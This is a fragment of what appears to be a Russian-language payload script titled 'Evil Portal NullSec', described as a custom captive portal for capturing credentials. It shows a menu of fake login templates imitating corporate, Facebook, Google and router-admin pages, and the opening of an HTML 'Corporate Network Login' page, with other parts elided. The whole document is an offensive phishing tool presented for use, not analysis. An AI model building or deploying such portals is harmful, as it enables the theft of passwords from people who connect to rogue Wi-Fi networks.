...
# Title: Злой Портал NullSec
# Author: bad-antics
# Description: Кастомный captive portal с брендингом NullSec для захвата учетных данных
# Category: nullsec
...
PROMPT "ЗЛОЙ ПОРТАЛ NULLSEC

Кастомный captive portal с
брендингом NullSec для сбора
учетных данных.
...
# Select template
PROMPT "ВЫБРАТЬ ШАБЛОН:

1. Корпоративный/Предприятие
2. Условия и Положения
3. Логин Facebook
4. Логин Google
5. Страница Админа Роутера

Выберите номер на следующем экране."
...
<html>
<head>
<title>Corporate Сеть Login</title>
